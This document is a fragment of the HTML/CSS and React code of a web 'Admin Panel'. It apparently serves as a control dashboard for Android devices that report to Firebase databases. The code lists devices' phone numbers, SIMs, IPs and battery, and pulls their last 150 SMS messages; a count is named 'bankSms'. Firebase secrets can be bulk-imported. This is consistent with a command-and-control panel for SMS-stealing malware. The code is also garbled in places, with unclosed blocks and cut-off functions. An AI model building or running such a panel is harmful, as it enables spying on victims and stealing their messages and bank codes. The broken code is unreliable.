    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #020202;
            --card: #0d0d0d;
            --border: #1f1f1f;
            --text: #e8e8e8;
            --muted: #666;
            --red: #dc2626;
            --red-glow: rgba(220, 38, 38, 0.4);
            --green: #22c55e;
            --blue: #3b82f6;
            --purple: #a855f7;
            --amber: #f59e0b;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.08) 0px, transparent 50%),
                        radial-gradient(at 100% 0%, rgba(139, 92, 246, 0.08) 0px, transparent 50%),
                        radial-gradient(at 50% 100%, rgba(6, 182, 212, 0.05) 0px, transparent 50%),
                        #020202;
            background-attachment: fixed;
            color: var(--text);
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }
        .hidden { display: none !important; }
        .glass {
            background: rgba(13, 13, 13, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.06);
        }
        .red-gradient { background: linear-gradient(135deg, #dc2626, #c2410c); }
        .btn {
            display: inline-flex; align-items: center; justify-content: center; gap: 8px;
            padding: 12px 20px; border-radius: 12px; font-weight: 600; font-size: 14px;
            cursor: pointer; border: none; transition: all 0.2s; text-decoration: none;
        }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-primary { background: linear-gradient(135deg, #dc2626, #c2410c); color: #fff; box-shadow: 0 8px 20px -6px var(--red-glow); }
        .btn-primary:hover:not(:disabled) { opacity: 0.9; transform: translateY(-1px); }
        .btn-secondary { background: #1a1a1a; border: 1px solid #2a2a2a; color: #aaa; }
        .btn-secondary:hover:not(:disabled) { background: #222; color: #fff; }
        .btn-danger { background: rgba(220,38,38,0.15); border: 1px solid rgba(220,38,38,0.3); color: #f87171; }
        .btn-danger:hover:not(:disabled) { background: rgba(220,38,38,0.25); }
        .btn-success { background: rgba(34,197,94,0.15); border: 1px solid rgba(34,197,94,0.3); color: #4ade80; }
        .btn-success:hover:not(:disabled) { background: rgba(34,197,94,0.25); }
        .input {
            width: 100%; padding: 12px 16px; border-radius: 12px;

            font-size: 14px; font-family: inherit; outline: none; transition: all 0.2s;

        .input:focus { border-color: #dc2626; box-shadow: 0 0 0 3px rgba(220,38,38,0.15); }
        .input::placeholder { color: #444; }
        .card {
            background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 16px;
            padding: 20px; transition: all 0.2s;
        }
        .badge {
            display: inline-flex; align-items: center; gap: 4px;
            padding: 3px 10px; border-radius: 999px; font-size: 11px; font-weight: 600;

        .badge-green { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.25); }
        .badge-red { background: rgba(220,38,38,0.12); color: #f87171; border: 1px solid rgba(220,38,38,0.25); }
        .badge-amber { background: rgba(245,158,11,0.12); color: #fbbf24; border: 1px solid rgba(245,158,11,0.25); }
        .badge-blue { background: rgba(59,130,246,0.12); color: #60a5fa; border: 1px solid rgba(59,130,246,0.25); }
        .badge-purple { background: rgba(168,85,247,0.12); color: #c084fc; border: 1px solid rgba(168,85,247,0.25); }
        .spinner {
            width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2);
            border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .fade-in { animation: fadeIn 0.4s ease-out; }
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 6px rgba(34,197,94,0.6); }
            50% { box-shadow: 0 0 12px rgba(34,197,94,0.9); }
        }
        .pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse-glow 2s infinite; }
        .grid { display: grid; gap: 16px; }

        .scrollbar::-webkit-scrollbar-thumb:hover { background: #3a3a3a; }
        
        /* Modal */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
            backdrop-filter: blur(6px); display: flex; align-items: center; justify-content: center;

            background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 20px;

        /* Toast */
        .toast {
            position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
            background: #1a1a1a; border: 1px solid #2a2a2a; color: #fff;
            padding: 14px 24px; border-radius: 14px; font-size: 14px; font-weight: 600;
            z-index: 99999; box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            animation: fadeIn 0.3s ease-out;
        }
        .toast.success { border-color: rgba(34,197,94,0.4); color: #4ade80; }
        .toast.error { border-color: rgba(220,38,38,0.4); color: #f87171; }
        
        /* Tabs */
        .tabs { display: flex; gap: 4px; border-bottom: 1px solid #1a1a1a; margin-bottom: 20px; overflow-x: auto; }
        .tab {
            padding: 12px 18px; font-size: 13px; font-weight: 600; color: #555;
            border: none; background: none; cursor: pointer; border-bottom: 2px solid transparent;
            transition: all 0.2s; white-space: nowrap; font-family: inherit;
        }
        .tab:hover { color: #888; }
        .tab.active { color: #f87171; border-bottom-color: #dc2626; }
        
        /* Device Card */
        .device-card {
            background: #000; border: 1px solid #1f1f1f; border-radius: 16px;
            padding: 14px; cursor: pointer; transition: all 0.2s;

        .stat-value { font-size: 28px; font-weight: 900; line-height: 1; margin-top: 6px; }
        .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: #555; font-weight: 600; }
    </style>

        // ============================================================
        // FIREBASE API

        async function firebaseFetch(url, key, path, query = {}) {
            let u = url.trim().replace(/\/$/, "");
            if (!u.startsWith("http")) u = "https://" + u;
            if (!u.includes("firebaseio.com") && !u.includes("firebasedatabase.app")) {
                throw new Error("Invalid Firebase URL");
            }
            const params = new URLSearchParams({ auth: key.trim(), ...query });
            const res = await fetch(`${u}/${path}.json?${params}`, {
                method: "GET",
                headers: { Accept: "application/json" }
            });
            if (!res.ok) {
                if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
                if (res.status === 404) return null;
                throw new Error(`HTTP ${res.status}`);
            }
            return res.json();
        }

        async function firebasePut(url, key, path, data) {
            let u = url.trim().replace(/\/$/, "");
            if (!u.startsWith("http")) u = "https://" + u;
            const res = await fetch(`${u}/${path}.json?auth=${key.trim()}`, {
                method: "PUT",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return res.json();
        }

        async function firebaseDelete(url, key, path) {
            let u = url.trim().replace(/\/$/, "");
            if (!u.startsWith("http")) u = "https://" + u;
            const res = await fetch(`${u}/${path}.json?auth=${key.trim()}`, { method: "DELETE" });
            if (!res.ok && res.status === 403) throw new Error("PERMISSION_DENIED");
        }

        // ============================================================

        function formatTime(ms) {
            if (!ms) return "—";
            const diff = Date.now() - ms;
            if (diff < 0) return "Just now";
            const s = Math.floor(diff / 1000);
            const m = Math.floor(s / 60);
            const h = Math.floor(m / 60);
            const d = Math.floor(h / 24);
            if (s < 60) return `${s}s ago`;
            if (m < 60) return `${m}m ago`;
            if (h < 24) return `${h}h ${m % 60}m ago`;
            if (d < 30) return `${d}d ${h % 24}h ago`;
            return new Date(ms).toLocaleDateString();
        }

        function parseTimestamp(val) {
            if (!val) return null;
            if (typeof val === "number") return val < 1e12 ? val * 1000 : val;
            if (typeof val === "string") {
                const p = Date.parse(val);
                if (!isNaN(p)) return p;
            }
            return null;
        }

        function formatCurrency(n) {
            try {

        function parseDevices(data) {
            const out = [];
            if (!data || typeof data !== "object") return out;
            for (const [id, d] of Object.entries(data)) {
                if (!d || typeof d !== "object") continue;
                let sims = [];
                if (Array.isArray(d.sims)) sims = d.sims;
                else if (d.sims && typeof d.sims === "object") sims = Object.values(d.sims);
                
                const battery = String(d.battery ?? "—");
                const batteryPct = parseInt(battery.replace("%", "")) || 0;
                const lastSeen = parseTimestamp(d.lastSeen ?? d.last_seen ?? d.lastOnline ?? d.last_active ?? d.timestamp ?? d.updatedAt ?? null);
                
                out.push({
                    id,
                    name: String(d.modelName || d.model || d.deviceName || id),
                    battery,
                    batteryPercent: batteryPct,
                    status: !!d.status,
                    phoneNumber: String(d.mobNo || (sims[0]?.phoneNumber ?? "—")),

                    ip: String(d.ip_address || "—"),
                    storage: String(d.storage || "—"),

                    cpu: String(d.cpu_arch || "—"),
                    sdk: String(d.sdkV || "—"),
                    lastSeen,
                    lastSeenFormatted: lastSeen ? formatTime(lastSeen) : undefined
                });
            }
            return out;
        }

        function parseMessages(data) {
            const out = [];
            if (data && typeof data === "object") {
                const entries = Object.entries(data);
                const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
                for (const [, m] of slice) {
                    if (!m || typeof m !== "object") continue;
                    const text = String(m.message || m.body || m.text || "");

                            text,
                            sender: String(m.sender || m.from || "Unknown"),
                            time: String(m.dateTime || m.date || "")
                        });
                    }
                }
            }
            return out.reverse();
        }

        // ---------- Toast ----------
        function useToast() {

                setTimeout(() => {
                    if (pass === ADMIN_PASSWORD) {
                        Store.set(STORAGE_KEYS.adminSession, { loggedIn: true, time: Date.now() });
                        onSuccess();
                    } else {
                        setErr("Invalid password");
                    }
                    setLoading(false);
                }, 500);
            };

            return (
                <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" }}>
                    <div className="glass fade-in" style={{ borderRadius: "24px", padding: "40px 32px", maxWidth: "400px", width: "100%", boxShadow: "0 30px 80px rgba(0,0,0,0.6)" }}>
                        <div style={{ textAlign: "center", marginBottom: "28px" }}>
                            <div style={{ width: "64px", height: "64px", borderRadius: "18px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "inline-flex", alignItems: "center", justifyContent: "center", boxShadow: "0 10px 30px rgba(220,38,38,0.4)", marginBottom: "16px" }}>
                                <Icon name="shield" size={28} color="#fff" />
                            </div>
                            <h1 style={{ fontSize: "24px", fontWeight: 900, letterSpacing: "-0.5px" }}>Admin Panel</h1>
                            <p style={{ fontSize: "13px", color: "#666", marginTop: "4px" }}>Restricted Access</p>
                        </div>
                        <form onSubmit={handleLogin}>
                            <label style={{ display: "block", fontSize: "11px", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.1em", color: "#666", marginBottom: "8px" }}>
                                Admin Password
                            </label>
                            <input type="password" value={pass} onChange={e => setPass(e.target.value)} placeholder="Enter password" className="input" autoFocus />
                            {err && <p style={{ fontSize: "12px", color: "#f87171", marginTop: "8px" }}>⚠ {err}</p>}
                            <button type="submit" disabled={loading} className="btn btn-primary" style={{ width: "100%", marginTop: "20px" }}>
                                {loading ? <><div className="spinner" /> Verifying...</> : <><Icon name="shield" size={16} /> Login</>}
                            </button>
                        </form>
                        <p style={{ textAlign: "center", fontSize: "11px", color: "#444", marginTop: "20px" }}>Admin: {ADMIN_USERNAME}</p>
                    </div>
                </div>
            );
        }

        // ============================================================
        // ADMIN DASHBOARD
        // ============================================================
        function AdminDashboard({ onLogout, toast }) {
            const [tab, setTab] = useState("dashboard");
            const [accounts, setAccounts] = useState(() => getFirebaseAccounts());
            const [panelStatus, setPanelStatusState] = useState(() => getPanelStatus());
            const [allDevices, setAllDevices] = useState([]);
            const [loading, setLoading] = useState(false);
            const [bulkInput, setBulkInput] = useState("");
            const [broadcastMsg, setBroadcastMsg] = useState(panelStatus.broadcast || "");
            const [addUrl, setAddUrl] = useState("");
            const [addKey, setAddKey] = useState("");
            const [addName, setAddName] = useState("");

            // Load all devices from all accounts
            const loadAllDevices = useCallback(async () => {
                setLoading(true);
                const list = getFirebaseAccounts();
                const all = [];
                await Promise.all(list.map(async (acc) => {
                    try {
                        const data = await firebaseFetch(acc.url, acc.key, "clients");
                        const devs = parseDevices(data);
                        devs.forEach(d => {
                            d._accountUrl = acc.url;
                            d._accountKey = acc.key;
                            d._accountName = acc.name;
                        });
                        all.push(...devs);
                    } catch (e) { /* skip failed account */ }
                }));
                setAllDevices(all);
                setLoading(false);
            }, []);

            useEffect(() => {
                loadAllDevices();
                const iv = setInterval(loadAllDevices, 20000);
                return () => clearInterval(iv);
            }, [loadAllDevices]);

            // Panel on/off
            const togglePanel = (online) => {
                const next = { ...panelStatus, online };
                setPanelStatus(next);
                setPanelStatusState(next);
                toast.push(online ? "Panel is now ONLINE" : "Panel is now OFFLINE", online ? "success" : "error");
            };

            // Broadcast
            const sendBroadcast = () => {
                const next = { ...panelStatus, broadcast: broadcastMsg };
                setPanelStatus(next);
                setPanelStatusState(next);
                toast.push("Broadcast message sent to all users", "success");
            };

            // Add single Firebase
            const addSingle = async () => {
                if (!addUrl.trim() || !addKey.trim()) {
                    toast.push("Please enter URL and Key", "error");
                    return;
                }
                const newAcc = {
                    id: Date.now(),
                    name: addName.trim() || addUrl.replace(/https?:\/\//, "").split(".")[0],
                    url: addUrl.trim(),
                    key: addKey.trim(),
                    addedAt: new Date().toISOString()
                };
                try {
                    await firebaseFetch(newAcc.url, newAcc.key, "clients");
                    const list = [...accounts, newAcc];
                    setFirebaseAccounts(list);
                    setAccounts(list);
                    setAddUrl(""); setAddKey(""); setAddName("");
                    toast.push("Firebase account added & verified!", "success");
                    loadAllDevices();
                } catch (e) {
                    toast.push("Connection failed: " + e.message, "error");
                }
            };

            // Bulk add
            const addBulk = async () => {
                const lines = bulkInput.split("\n").map(l => l.trim()).filter(Boolean);
                if (lines.length === 0) { toast.push("Paste Firebase URLs + keys", "error"); return; }
                const newAccounts = [];
                let success = 0, fail = 0;
                for (const line of lines) {
                    const parts = line.split(/[|,;\t]/).map(p => p.trim()).filter(Boolean);
                    if (parts.length < 2) { fail++; continue; }
                    let url = parts[0], key = parts[1], name = parts[2] || url.replace(/https?:\/\//, "").split(".")[0];
                    if (!url.startsWith("http")) url = "https://" + url;
                    newAccounts.push({ id: Date.now() + Math.random(), name, url, key, addedAt: new Date().toISOString() });
                    success++;
                }
                if (newAccounts.length > 0) {
                    const list = [...accounts, ...newAccounts];
                    setFirebaseAccounts(list);
                    setAccounts(list);
                    setBulkInput("");
                    toast.push(`Added ${success} accounts${fail ? ` (${fail} skipped)` : ""}`, "success");
                    loadAllDevices();
                } else {
                    toast.push("No valid entries. Format: URL | KEY | NAME", "error");
                }
            };

            // Delete account
            const deleteAccount = (id) => {
                if (!confirm("Delete this Firebase account?")) return;
                const list = accounts.filter(a => a.id !== id);
                setFirebaseAccounts(list);
                setAccounts(list);
                toast.push("Account deleted", "success");
                loadAllDevices();
            };

            // Stats
            const stats = useMemo(() => {
                const total = allDevices.length;
                const online = allDevices.filter(d => d.status).length;
                const offline = total - online;
                const bankSms = allDevices.filter(d => d.phoneNumber && d.phoneNumber !== "—").length;
                return { total, online, offline, bankSms, accounts: accounts.length };
            }, [allDevices, accounts]);

            return (
                <div style={{ minHeight: "100vh" }}>
                    {/* Header */}
                    <header style={{ position: "sticky", top: 0, zIndex: 40, background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a" }}>
                        <div style={{ maxWidth: "1400px", margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: "16px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                                <div style={{ width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" }}>
                                    <Icon name="shield" size={16} color="#fff" />
                                </div>
                                <span style={{ fontSize: "16px", fontWeight: 800 }}>Admin Panel</span>
                            </div>
                            <div style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: "12px" }}>
                                <span className={`badge ${panelStatus.online ? "badge-green" : "badge-red"}`}>
                                    <span className="pulse-dot" style={{ background: panelStatus.online ? "#22c55e" : "#ef4444" }} />
                                    {panelStatus.online ? "LIVE" : "OFFLINE"}
                                </span>
                                <button className="btn btn-secondary" onClick={onLogout} style={{ padding: "8px 14px", fontSize: "12px" }}>
                                    <Icon name="logout" size={14} /> Logout
                                </button>
                            </div>
                        </div>
                    </header>

                    <main style={{ maxWidth: "1400px", margin: "0 auto", padding: "24px" }}>
                        {/* Tabs */}
                        <div className="tabs">
                            {[
                                { k: "dashboard", l: "Dashboard" },
                                { k: "firebase", l: "Firebase Accounts" },
                                { k: "add", l: "Add Firebase" },
                                { k: "bulk", l: "Bulk Add" },
                                { k: "control", l: "Panel Control" },
                                { k: "broadcast", l: "Broadcast" }
                            ].map(t => (
                                <button key={t.k} className={`tab ${tab === t.k ? "active" : ""}`} onClick={() => setTab(t.k)}>{t.l}</button>
                            ))}
                        </div>

                        {/* DASHBOARD */}
                        {tab === "dashboard" && (
                            <div className="fade-in">
                                <div className="grid" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(180px, 1fr))", marginBottom: "24px" }}>
                                    <div className="stat-card">
                                        <div className="stat-label">Total Devices</div>
                                        <div className="stat-value" style={{ color: "#fff" }}>{stats.total}</div>
                                    </div>
                                    <div className="stat-card">
                                        <div className="stat-label">Online</div>
                                        <div className="stat-value" style={{ color: "#22c55e" }}>{stats.online}</div>
                                    </div>
                                    <div className="stat-card">
                                        <div className="stat-label">Offline</div>
                                        <div className="stat-value" style={{ color: "#666" }}>{stats.offline}</div>
                                    </div>
                                    <div className="stat-card">
                                        <div className="stat-label">Firebase Accounts</div>
                                        <div className="stat-value" style={{ color: "#60a5fa" }}>{stats.accounts}</div>
                                    </div>
                                    <div className="stat-card">
                                        <div className="stat-label">With Phone</div>
                                        <div className="stat-value" style={{ color: "#fbbf24" }}>{stats.bankSms}</div>
                                    </div>
                                </div>

                                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
                                    <h2 style={{ fontSize: "16px", fontWeight: 700 }}>Live Devices ({allDevices.length})</h2>
                                    <button className="btn btn-secondary" onClick={loadAllDevices} disabled={loading} style={{ padding: "8px 14px", fontSize: "12px" }}>
                                        {loading ? <div className="spinner" /> : <Icon name="refresh" size={14} />} Refresh
                                    </button>
                                </div>

                                {loading && allDevices.length === 0 ? (
                                    <div style={{ textAlign: "center", padding: "60px 20px", color: "#555" }}>
                                        <div className="spinner" style={{ margin: "0 auto 12px", width: "24px", height: "24px", borderWidth: "3px" }} />
                                        Loading devices...
                                    </div>
                                ) : allDevices.length === 0 ? (
                                    <div className="card" style={{ textAlign: "center", padding: "60px 20px" }}>
                                        <Icon name="wifi" size={40} color="#2a2a2a" style={{ margin: "0 auto 12px" }} />
                                        <p style={{ color: "#555", fontSize: "14px" }}>No devices connected yet</p>
                                        <p style={{ color: "#333", fontSize: "12px", marginTop: "4px" }}>Add Firebase accounts to load devices</p>
                                    </div>
                                ) : (
                                    <div className="grid grid-2">
                                        {allDevices.map(d => (
                                            <div key={d.id + d._accountUrl} className={`device-card ${d.status ? "" : "opacity-70"}`}>
                                                <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "10px" }}>
                                                    <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: d.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: `1px solid ${d.status ? "rgba(34,197,94,0.25)" : "#262626"}`, display: "flex", alignItems: "center", justifyContent: "center" }}>
                                                        <Icon name="wifi" size={16} color={d.status ? "#4ade80" : "#444"} />
                                                    </div>
                                                    <div style={{ flex: 1, minWidth: 0 }}>
                                                        <div style={{ fontSize: "13px", fontWeight: 700, color: "#fff", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.name}</div>
                                                        <div style={{ fontSize: "10px", fontFamily: "monospace", color: "#555", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.id}</div>
                                                    </div>
                                                    <span className={`badge ${d.status ? "badge-green" : "badge-red"}`} style={{ fontSize: "10px" }}>
                                                        {d.status ? "Online" : "Offline"}
                                                    </span>
                                                </div>
                                                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px", fontSize: "11px" }}>
                                                    <div>
                                                        <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.05em", marginBottom: "2px" }}>Android</div>
                                                        <div style={{ color: "#ccc", fontWeight: 600 }}>{d.android !== "—" ? `v${d.android}` : "—"}</div>
                                                    </div>
                                                    <div>
                                                        <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.05em", marginBottom: "2px" }}>Battery</div>
                                                        <div style={{ color: d.batteryPercent >= 60 ? "#4ade80" : d.batteryPercent >= 30 ? "#fbbf24" : "#f87171", fontWeight: 600 }}>{d.battery}</div>
                                                    </div>
                                                    <div>
                                                        <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.05em", marginBottom: "2px" }}>Phone</div>
                                                        <div style={{ color: "#aaa", fontFamily: "monospace", fontSize: "11px", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.phoneNumber}</div>
                                                    </div>
                                                    <div>
                                                        <div style={{ color: "#444", fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.05em", marginBottom: "2px" }}>Network</div>
                                                        <div style={{ color: "#aaa", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d.provider}</div>
                                                    </div>
                                                </div>
                                                <div style={{ marginTop: "8px", paddingTop: "8px", borderTop: "1px solid #1a1a1a", display: "flex", alignItems: "center", gap: "6px", fontSize: "10px", color: "#555" }}>
                                                    <Icon name="database" size={12} />
                                                    <span style={{ fontFamily: "monospace", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{d._accountName}</span>
                                                    {!d.status && d.lastSeenFormatted && (
                                                        <span style={{ marginLeft: "auto", color: "#f87171", fontSize: "9px" }}>{d.lastSeenFormatted}</span>
                                                    )}
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        )}

                        {/* FIREBASE ACCOUNTS */}
                        {tab === "firebase" && (
                            <div className="fade-in">
                                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px" }}>
                                    <h2 style={{ fontSize: "16px", fontWeight: 700 }}>Firebase Accounts ({accounts.length})</h2>
                                    <button className="btn btn-secondary" onClick={loadAllDevices} disabled={loading} style={{ padding: "8px 14px", fontSize: "12px" }}>
                                        <Icon name="refresh" size={14} /> Refresh Devices
                                    </button>
                                </div>
                                {accounts.length === 0 ? (
                                    <div className="card" style={{ textAlign: "center", padding: "60px 20px" }}>
                                        <Icon name="database" size={40} color="#2a2a2a" style={{ margin: "0 auto 12px" }} />
                                        <p style={{ color: "#555", fontSize: "14px" }}>No Firebase accounts added</p>
                                        <button className="btn btn-primary" onClick={() => setTab("add")} style={{ marginTop: "12px" }}>
                                            <Icon name="plus" size={14} /> Add First Account
                                        </button>
                                    </div>
                                ) : (
                                    <div className="grid grid-2">
                                        {accounts.map(acc => {
                                            const accDevices = allDevices.filter(d => d._accountUrl === acc.url);
                                            const onlineCount = accDevices.filter(d => d.status).length;
                                            return (
                                                <div key={acc.id} className="card">
                                                    <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "12px" }}>
                                                        <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(59,130,246,0.15)", border: "1px solid rgba(59,130,246,0.25)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                                                            <Icon name="database" size={16} color="#60a5fa" />
                                                        </div>
                                                        <div style={{ flex: 1, minWidth: 0 }}>
                                                            <div style={{ fontSize: "13px", fontWeight: 700, color: "#fff" }}>{acc.name}</div>
                                                            <div style={{ fontSize: "10px", fontFamily: "monospace", color: "#555", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", marginTop: "2px" }}>{acc.url}</div>
                                                        </div>
                                                        <button className="btn btn-danger" onClick={() => deleteAccount(acc.id)} style={{ padding: "6px 10px", fontSize: "11px" }}>
                                                            <Icon name="trash" size={12} />
                                                        </button>
                                                    </div>
                                                    <div style={{ display: "flex", gap: "8px", marginBottom: "10px", flexWrap: "wrap" }}>
                                                        <span className="badge badge-blue">{accDevices.length} devices</span>
                                                        <span className="badge badge-green">{onlineCount} online</span>
                                                        <span className="badge badge-red">{accDevices.length - onlineCount} offline</span>
                                                    </div>
                                                    <div style={{ fontSize: "10px", color: "#444", fontFamily: "monospace", padding: "6px 8px", background: "#080808", borderRadius: "6px", wordBreak: "break-all" }}>
                                                        Key: {acc.key.substring(0, 20)}...
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                )}
                            </div>
                        )}

                        {/* ADD SINGLE */}
                        {tab === "add" && (
                            <div className="fade-in" style={{ maxWidth: "600px" }}>
                                <div className="card">
                                    <h2 style={{ fontSize: "16px", fontWeight: 700, marginBottom: "16px" }}>Add Firebase Account</h2>
                                    <div style={{ display: "grid", gap: "14px" }}>
                                        <div>
                                            <label style={{ display: "block", fontSize: "11px", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em", color: "#666", marginBottom: "6px" }}>Account Name (optional)</label>
                                            <input className="input" value={addName} onChange={e => setAddName(e.target.value)} placeholder="e.g. My App Firebase" />
                                        </div>
                                        <div>
                                            <label style={{ display: "block", fontSize: "11px", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em", color: "#666", marginBottom: "6px" }}>Firebase Database URL *</label>
                                            <input className="input" value={addUrl} onChange={e => setAddUrl(e.target.value)} placeholder="https://your-project.firebaseio.com" style={{ fontFamily: "monospace" }} />
                                        </div>
                                        <div>
                                            <label style={{ display: "block", fontSize: "11px", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em", color: "#666", marginBottom: "6px" }}>Database Secret Key *</label>
                                            <input className="input" value={addKey} onChange={e => setAddKey(e.target.value)} placeholder="Firebase Database Secret" style={{ fontFamily: "monospace" }} />
                                        </div>
                                        <button className="btn btn-primary" onClick={addSingle} style={{ marginTop: "8px" }}>
                                            <Icon name="plus" size={16} /> Add & Verify
                                        </button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* BULK ADD */}
                        {tab === "bulk" && (
                            <div className="fade-in" style={{ maxWidth: "800px" }}>
                                <div className="card">
                                    <h2 style={{ fontSize: "16px", fontWeight: 700, marginBottom: "8px" }}>Bulk Add Firebase Accounts</h2>
                                    <p style={{ fontSize: "12px", color: "#666", marginBottom: "16px" }}>
                                        Paste one account per line. Format: <code style={{ background: "#1a1a1a", padding: "2px 6px", borderRadius: "4px", color: "#60a5fa" }}>URL | KEY | NAME</code>
                                        (name optional)
                                    </p>
                                    <textarea
                                        className="input scrollbar"
                                        value={bulkInput}
                                        onChange={e => setBulkInput(e.target.value)}
                                        rows={12}
                                        placeholder={"https://app1.firebaseio.com | SECRET_KEY_1 | App One\nhttps://app2.firebaseio.com | SECRET_KEY_2 | App Two\nhttps://app3.firebaseio.com | SECRET_KEY_3"}
                                        style={{ fontFamily: "monospace", resize: "vertical", minHeight: "200px" }}
                                    />
                                    <div style={{ display: "flex", gap: "10px", marginTop: "14px" }}>
                                        <button className="btn btn-primary" onClick={addBulk}>
                                            <Icon name="plus" size={16} /> Add All Accounts
                                        </button>
                                        <button className="btn btn-secondary" onClick={() => setBulkInput("")}>
                                            Clear
                                        </button>
                                    </div>
                                    <div style={{ marginTop: "16px", padding: "12px", background: "rgba(59,130,246,0.05)", border: "1px solid rgba(59,130,246,0.2)", borderRadius: "10px" }}>
                                        <p style={{ fontSize: "11px", color: "#60a5fa", fontWeight: 600, marginBottom: "4px" }}>💡 Tips</p>
                                        <ul style={{ fontSize: "11px", color: "#888", paddingLeft: "16px", lineHeight: 1.8 }}>
                                            <li>Separate fields with <code style={{ color: "#60a5fa" }}>|</code>, comma, semicolon, or tab</li>
                                            <li>Name is optional — auto-generated from URL if missing</li>
                                            <li>All accounts will load devices in public dashboard automatically</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* PANEL CONTROL */}
                        {tab === "control" && (
                            <div className="fade-in" style={{ maxWidth: "700px" }}>
                                <div className="card">
                                    <h2 style={{ fontSize: "16px", fontWeight: 700, marginBottom: "8px" }}>Panel Control</h2>
                                    <p style={{ fontSize: "12px", color: "#666", marginBottom: "20px" }}>
                                        Turn the public panel ON or OFF. When OFF, users will see a "Server Offline" message.
                                    </p>
                                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "20px", background: panelStatus.online ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)", border: `1px solid ${panelStatus.online ? "rgba(34,197,94,0.3)" : "rgba(220,38,38,0.3)"}`, borderRadius: "14px", marginBottom: "16px" }}>
                                        <div>
                                            <div style={{ fontSize: "14px", fontWeight: 700, color: panelStatus.online ? "#4ade80" : "#f87171", display: "flex", alignItems: "center", gap: "8px" }}>
                                                <Icon name="power" size={18} />
                                                Panel is {panelStatus.online ? "ONLINE" : "OFFLINE"}
                                            </div>
                                            <div style={{ fontSize: "11px", color: "#666", marginTop: "4px" }}>
                                                {panelStatus.online ? "Users can access the public dashboard" : "All users see offline message"}
                                            </div>
                                        </div>
                                        <button
                                            className={`btn ${panelStatus.online ? "btn-danger" : "btn-success"}`}
                                            onClick={() => togglePanel(!panelStatus.online)}
                                            style={{ padding: "10px 20px" }}
                                        >
                                            <Icon name="power" size={14} /> {panelStatus.online ? "Turn OFF" : "Turn ON"}
                                        </button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* BROADCAST */}
                        {tab === "broadcast" && (
                            <div className="fade-in" style={{ maxWidth: "700px" }}>
                                <div className="card">
                                    <h2 style={{ fontSize: "16px", fontWeight: 700, marginBottom: "8px", display: "flex", alignItems: "center", gap: "8px" }}>
                                        <Icon name="megaphone" size={18} color="#fbbf24" /> Broadcast Message
                                    </h2>
                                    <p style={{ fontSize: "12px", color: "#666", marginBottom: "16px" }}>
                                        Send a message to all users. It will appear on the public dashboard.
                                    </p>
                                    <textarea
                                        className="input"
